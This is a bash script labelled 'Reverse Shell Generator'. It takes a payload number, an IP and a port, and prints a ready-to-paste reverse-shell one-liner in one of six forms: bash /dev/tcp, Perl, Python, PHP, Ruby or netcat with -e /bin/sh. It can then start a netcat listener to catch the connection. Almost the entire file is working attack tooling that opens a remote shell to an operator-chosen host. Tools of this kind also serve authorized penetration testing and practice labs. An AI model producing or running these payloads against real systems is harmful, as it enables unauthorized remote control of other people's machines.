#!/bin/bash
green='\e[32m'
end='\e[1m'
terminal=$TERM
first_payload=$1
ip=$2
port=$3
function header {
    clear
    figlet -f slant -c "Reverse Shell Generator" | lolcat;figlet -f digital -c "by 1ms"  | lolcat
}
function second_payload {
    case $first_payload in
        1)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}"bash -i >& /dev/tcp/$ip/$port 0>&1"\n${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer
            
            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;
            
        2)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}'perl -e '\''use Socket;$i="'"$ip"'";$p='"$port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer

            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;

        3)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer

            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;
        4)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}"php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer

            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;
        5)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}'ruby -rsocket -e'\''f=TCPSocket.open("'$ip'",'$port').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'''${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer

            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;
        6)
            echo -e "\nCopy the following payload..\n"
            echo -e ${green}"nc -e /bin/sh $ip $port"${end}
            echo -e "\nRun netcat? y/n"
            echo -ne "---> "
            read answer

            if [ $answer = "y" ]
            then
            header
            nc -lnvp $port
            fi
            ;;        
        *)
            echo "Incorrect input!"
            ;;
    esac
}
second_payload
